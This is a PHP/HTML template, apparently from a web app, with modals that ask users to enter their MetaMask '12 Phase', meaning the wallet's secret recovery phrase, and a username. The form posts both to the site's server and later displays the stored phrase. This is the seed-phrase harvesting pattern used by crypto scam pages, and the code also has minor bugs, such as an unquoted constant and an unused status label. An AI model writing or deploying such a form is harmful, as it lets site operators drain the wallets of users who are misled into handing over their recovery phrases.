<?php if ($m_wallet_status == 'm_3' && !$_GET['success_add_meta_mask']) { ?>

    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="input">Meta Mask 12 Phase</label>
                            <input type="text" class="form-control" name="wallet_phase"
                                   placeholder="Enter Wallet Phase">
                        </div>
                        <div class="form-group">
                            <label for="input2">Meta Mask Username</label>
                            <input type="text" class="form-control" name="wallet_username"
                                   placeholder="Metamask UserName">
                        </div>
                        <button type="submit" class="btn btn-primary" name="create_meta_mask">Submit</button>
                    </form>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } elseif ($m_wallet_status == 1) { ?>
    <!-- The Modal -->
    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
<?php
if ($m_wallet_status == 1){
    $wallet_status = 'connected';
}elseif($m_wallet_status == 2){
    $wallet_status = 'pending approval';
}elseif($m_wallet_status == m_3){
    $wallet_status = 'not connected';
}
?>
                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask<span
                            class="p-2 text-success bg-dark"><?= $m_wallet_status?></span></h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <div class="p-3 border-1">Your wallet phase</div>
                    <div class="p-3 border-1"><?= $m_wallet_phase ?></div>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } ?>
